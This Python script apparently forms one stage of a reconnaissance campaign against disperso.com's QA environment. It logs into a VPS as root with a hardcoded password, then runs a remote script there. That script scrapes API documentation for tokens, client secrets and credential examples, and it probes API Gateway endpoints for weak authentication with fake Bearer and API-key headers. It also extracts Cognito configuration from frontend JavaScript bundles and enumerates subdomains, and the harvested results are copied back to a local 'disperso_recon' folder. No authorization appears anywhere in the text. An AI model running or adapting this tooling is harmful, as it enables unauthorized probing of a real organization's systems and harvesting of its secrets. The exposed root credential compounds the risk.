"""Phase 6: Download API docs + probe QA API Gateway + frontend.qa."""
import paramiko, textwrap

VPS = "216.238.75.117"
PW = r"]Aq9mngH(_%ZV%jn"

REMOTE = textwrap.dedent(r'''
import json, urllib.request, urllib.error, ssl, time, re, html as htmlmod

ctx = ssl._create_unverified_context()

def req(url, data=None, headers=None, method=None, timeout=30):
    hdrs = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"}
    if headers:
        hdrs.update(headers)
    if isinstance(data, dict):
        data = json.dumps(data).encode()
    elif isinstance(data, str):
        data = data.encode()
    r = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        resp = urllib.request.urlopen(r, timeout=timeout, context=ctx)
        body = resp.read()
        return resp.status, body, dict(resp.headers)
    except urllib.error.HTTPError as e:
        body = e.read()
        return e.code, body, dict(e.headers)
    except Exception as e:
        return 0, str(e).encode(), {}

QA = "https://landing.qa.disperso.com"
QA_API = "https://clxkb4ym40.execute-api.us-east-2.amazonaws.com/qa"

# ======================================================
print("=" * 60)
print("1. DOWNLOAD API DOCS (284KB)")
print("=" * 60)

s, b, h = req(f"{QA}/docs/en/api/index.html")
if s == 200:
    content = b.decode(errors="replace")
    print(f"  Size: {len(b):,} bytes")
    
    # Strip HTML tags for text content
    text = re.sub(r'<script[^>]*>.*?</script>', '', content, flags=re.DOTALL)
    text = re.sub(r'<style[^>]*>.*?</style>', '', text, flags=re.DOTALL)
    text = re.sub(r'<[^>]+>', ' ', text)
    text = re.sub(r'\s+', ' ', text).strip()
    
    # Save raw text
    with open("/tmp/disperso_api_docs.txt", "w") as f:
        f.write(text)
    
    # Extract key patterns from the docs
    print("\n  === API ENDPOINTS ===")
    endpoints = re.findall(r'(GET|POST|PUT|PATCH|DELETE)\s+(/[a-zA-Z0-9/_\-{}\.:]+)', content)
    for method, path in endpoints[:50]:
        print(f"    {method} {path}")
    
    print("\n  === URLs ===")
    urls = re.findall(r'https?://[a-zA-Z0-9._\-/]+', content)
    for u in sorted(set(urls)):
        print(f"    {u}")
    
    print("\n  === AUTH/KEY/TOKEN/SECRET ===")
    for kw in ["Authorization", "Bearer", "api-key", "API_KEY", "apikey",
               "client_id", "client_secret", "access_token", "refresh_token",
               "X-Client", "X-Api", "x-api-key", "cognito",
               "sandbox", "test", "demo", "example"]:
        matches = re.findall(rf'.{{0,80}}{re.escape(kw)}.{{0,80}}', text, re.IGNORECASE)
        if matches:
            print(f"\n    [{kw}]:")
            for m in matches[:5]:
                clean = m.strip()[:150]
                print(f"      {clean}")
    
    print("\n  === HEADERS ===")
    headers_found = re.findall(r'["\']([A-Za-z]+-[A-Za-z]+(?:-[A-Za-z]+)*)["\']', content)
    unique_headers = sorted(set(h for h in headers_found if any(x in h.lower() for x in ["auth", "token", "key", "client", "api", "x-"])))
    for hdr in unique_headers[:20]:
        print(f"    {hdr}")
    
    print("\n  === CREDENTIALS/EXAMPLES ===")
    # Look for JSON examples with values
    json_blocks = re.findall(r'\{[^{}]{10,500}\}', content)
    for jb in json_blocks[:20]:
        if any(kw in jb.lower() for kw in ["email", "password", "token", "key", "auth", "client", "user"]):
            clean = re.sub(r'<[^>]+>', '', jb)
            clean = htmlmod.unescape(clean).strip()
            if len(clean) > 20:
                print(f"    {clean[:200]}")

# ======================================================
print("\n" + "=" * 60)
print("2. DOWNLOAD MAIN DOCS INDEX")
print("=" * 60)

s, b, h = req(f"{QA}/docs/en/index.html")
if s == 200:
    content = b.decode(errors="replace")
    text = re.sub(r'<[^>]+>', ' ', content)
    text = re.sub(r'\s+', ' ', text).strip()
    print(f"  Size: {len(b):,} bytes")
    # Look for nav links / sidebar
    nav_links = re.findall(r'href="([^"]*docs[^"]*)"', content)
    for link in sorted(set(nav_links))[:30]:
        print(f"    {link}")

# ======================================================
print("\n" + "=" * 60)
print("3. QA API GATEWAY PROBE (clxkb4ym40)")
print("=" * 60)

# Test QA endpoints - may have weaker auth
qa_paths = [
    "/api/v1/notification",
    "/api/v1/bank",
    "/api/v1/bank/catalog",
    "/api/v1/client-account",
    "/api/v1/user",
    "/api/v1/health",
    "/api/v1/status",
    "/api/v1/version",
    "/api/v1/ip-valid",
    "/api/v1/payment-order",
    "/api/v1/movement",
    "/api/v1/quote",
    "/api/v1/catalog",
    "/api/v1/document",
    "/api/v1/reporter",
]

print(f"  Base: {QA_API}")
for path in qa_paths:
    s, b, h = req(f"{QA_API}{path}")
    tag = "!!!" if s == 200 else "**" if s not in (403, 0) else ""
    print(f"  {tag} GET {path} -> {s} ({len(b)}b) {b[:150].decode(errors='replace') if len(b)<200 else ''}")
    time.sleep(0.3)

# POST notification on QA
s, b, h = req(f"{QA_API}/api/v1/notification",
              data={"type":"test","data":{"test":"from_qa_probe"}},
              headers={"Content-Type":"application/json"})
print(f"\n  POST /notification QA: {s} ({len(b)}b)")

# Try with fake auth on QA
s, b, h = req(f"{QA_API}/api/v1/bank",
              headers={"Authorization":"Bearer test123"})
print(f"  Bearer test123 /bank QA: {s} ({len(b)}b) {b[:150].decode(errors='replace')}")

s, b, h = req(f"{QA_API}/api/v1/bank",
              headers={"x-api-key":"test123"})
print(f"  x-api-key test123 /bank QA: {s} ({len(b)}b)")

# ======================================================
print("\n" + "=" * 60)
print("4. FRONTEND.QA.DISPERSO.COM PROBE")
print("=" * 60)

import socket
try:
    ip = socket.gethostbyname("frontend.qa.disperso.com")
    print(f"  Resolves: {ip}")
    
    s, b, h = req("https://frontend.qa.disperso.com/")
    print(f"  Root: {s} ({len(b)}b)")
    if s == 200:
        html = b.decode(errors="replace")
        # Extract scripts and config
        scripts = re.findall(r'src="([^"]+\.js[^"]*)"', html)
        print(f"  Scripts: {scripts}")
        
        # Look for different Cognito config
        cognito = re.findall(r'.{0,50}cognito.{0,50}', html, re.IGNORECASE)
        for c in cognito[:5]:
            print(f"  Cognito: {c.strip()[:120]}")
except Exception as e:
    print(f"  Error: {e}")

# ======================================================
print("\n" + "=" * 60)
print("5. QA APP LOGIN / COGNITO CONFIG")
print("=" * 60)

# Try to get the QA app bundle to extract Cognito config
try:
    ip = socket.gethostbyname("app.qa.disperso.com")
    print(f"  app.qa.disperso.com resolves: {ip}")
    s, b, h = req("https://app.qa.disperso.com/")
    if s == 200:
        print(f"  app.qa: {s} ({len(b)}b)")
except:
    print("  app.qa.disperso.com: NXDOMAIN")

# The frontend.qa might BE the app
# Download its JS bundle
try:
    s, b, h = req("https://frontend.qa.disperso.com/")
    if s == 200:
        html = b.decode(errors="replace")
        scripts = re.findall(r'src="([^"]+\.js[^"]*)"', html)
        for script_path in scripts:
            if script_path.startswith("/"):
                full = f"https://frontend.qa.disperso.com{script_path}"
            else:
                full = script_path
            
            s2, b2, h2 = req(full)
            if s2 == 200 and len(b2) > 10000:
                js = b2.decode(errors="replace")
                print(f"\n  QA JS Bundle: {len(b2):,} bytes")
                
                # Extract Cognito pool/client
                pools = re.findall(r'us-east-2_\w+', js)
                clients = re.findall(r'[a-z0-9]{20,30}', js)
                
                for kw in ["UserPool", "ClientId", "client_id", "cognito",
                            "execute-api", "disperso", "baseURL", "apiUrl",
                            "REACT_APP", "VITE_"]:
                    matches = re.findall(rf'.{{0,80}}{re.escape(kw)}.{{0,80}}', js, re.IGNORECASE)
                    if matches:
                        print(f"    [{kw}]:")
                        for m in matches[:3]:
                            print(f"      {m.strip()[:150]}")
                break
except Exception as e:
    print(f"  Error downloading QA bundle: {e}")

# ======================================================
print("\n" + "=" * 60)
print("6. DISPERSO QA SUBDOMAINS (extended)")
print("=" * 60)

extended = [
    "frontend.qa.disperso.com",
    "api.qa.disperso.com",
    "soporte.qa.disperso.com",
    "admin.qa.disperso.com",
    "dashboard.qa.disperso.com",
    "backend.qa.disperso.com",
    "auth.qa.disperso.com",
    "login.qa.disperso.com",
    "panel.qa.disperso.com",
]
for host in extended:
    try:
        ip = socket.gethostbyname(host)
        print(f"  LIVE: {host} -> {ip}")
        s, b, h = req(f"https://{host}/")
        print(f"    Root: {s} ({len(b)}b) {h.get('server','')}")
    except socket.gaierror:
        pass
    except Exception as e:
        print(f"  {host}: {e}")
    time.sleep(0.3)

print("\n" + "=" * 60)
print("PHASE 6 DONE")
print("=" * 60)
''')

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(VPS, username="root", password=PW, timeout=15)
sftp = ssh.open_sftp()
with sftp.file("/tmp/todo6.py", "w") as f:
    f.write(REMOTE)
sftp.close()
print(f"Connected {VPS}, running phase 6...")
stdin, stdout, stderr = ssh.exec_command("python3 /tmp/todo6.py 2>&1", timeout=300)
out = stdout.read().decode(errors="replace")
print(out)

# Also download the raw API docs for local analysis
print("\n\n=== DOWNLOADING RAW API DOCS ===")
sftp = ssh.open_sftp()
try:
    with sftp.file("/tmp/disperso_api_docs.txt", "r") as f:
        docs = f.read()
    with open(r"c:\xampp\htdocs\pentagi\disperso_recon\qa_api_docs.txt", "w", encoding="utf-8", errors="replace") as f:
        f.write(docs.decode(errors="replace") if isinstance(docs, bytes) else docs)
    print(f"  Saved {len(docs)} bytes to disperso_recon/qa_api_docs.txt")
except Exception as e:
    print(f"  Error downloading: {e}")
sftp.close()
ssh.close()
